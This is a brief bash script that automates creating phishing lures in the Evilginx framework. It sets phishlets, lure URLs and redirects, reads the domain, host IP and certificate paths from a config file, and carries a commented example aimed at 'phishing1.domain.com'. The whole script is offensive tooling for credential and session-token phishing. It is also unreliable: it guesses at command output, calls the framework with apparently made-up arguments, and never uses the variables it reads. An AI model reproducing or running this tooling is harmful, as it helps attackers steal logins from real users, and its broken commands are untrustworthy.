#!/bin/bash

create_lure() {
    phishlet=$1
    hostname=$2
    redirect_url=$3
    
    # Create the lure
    sudo evilginx lures create "$phishlet"

    # Get the generated URL (Assuming the command outputs it)
    local lure_url
    lure_url=$(sudo evilginx lures get-url "$phishlet" "$hostname")

    # Set the redirect URL
    sudo evilginx lures redirect "$phishlet" "$redirect_url"
}

# Read configuration from config.json
config_file="config.json"
domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
# Automate multiple lure creation
#create_lure "example" "phishing1.domain.com" "https://targetsite.com"
